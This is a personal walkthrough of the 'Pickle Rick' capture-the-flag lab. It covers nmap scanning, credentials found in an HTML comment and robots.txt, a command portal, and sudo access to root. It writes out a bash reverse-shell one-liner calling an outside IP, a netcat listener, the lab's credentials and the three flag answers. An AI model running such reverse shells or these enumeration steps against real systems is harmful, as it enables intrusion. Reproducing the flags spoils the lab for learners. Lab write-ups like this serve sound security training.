The Pickle Rick CTF was my first ever completed CTF

It goes over hacking into a vulnerable website to find three secret ingredients/flags. 

So the first thing that I did was run an nmap scan on the target IP, while simultaneously opening the webpage.

nmap -sV -sC 10.10.102.29
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

On the webpage I pressed F12 to open the developer console and noticed a comment that told me a username was: 

<!--Note to self, remember username! Username: R1ckRul3s-->

It's always good with a website to check the robots.txt file so I typed in:
10.10.102.29/robots.txt

This gave me a possible password: Wubbalubbadubdub


There was no input for a login on the website so I used DirBuster to enumerate possible subdirectories
I found a login.php page doing this

So I went to 10.10.102.29/login.php and entered the credentials given.

I was presented with a command line interface and could do things such as ls.

This showed me the first ingredient:
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

The website blocked cat so I instantly thought about starting a reverse shell so I listened and entered this reverse shell payload:

bash -c 'bash -i >& /dev/tcp/10.6.4.208/5555 0>&1'

I used netcat to listen for the reverse shell and got the first ingredient.

└─$ nc -lvp 5555

www-data@ip-10-10-102-29:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair

Upon looking in clue.txt it said:
cat clue.txt
Look around the file system for the other ingredient.

So I started navigating the file system and found the second ingredient in:
www-data@ip-10-10-102-29:/home/rick$ ls
ls
second ingredients
www-data@ip-10-10-102-29:/home/rick$ cat "second ingredients"
cat "second ingredients"
1 jerry tear

I couldn't find anymore ingredients laying around so I attempted to escalate privellages.
Eventually finding this:
www-data@ip-10-10-102-29:/home$ sudo ls /root
sudo ls /root
3rd.txt
snap
www-data@ip-10-10-102-29:/home$ sudo cat /root/3rd.txt
sudo cat /root/3rd.txt
3rd ingredients: fleeb juice
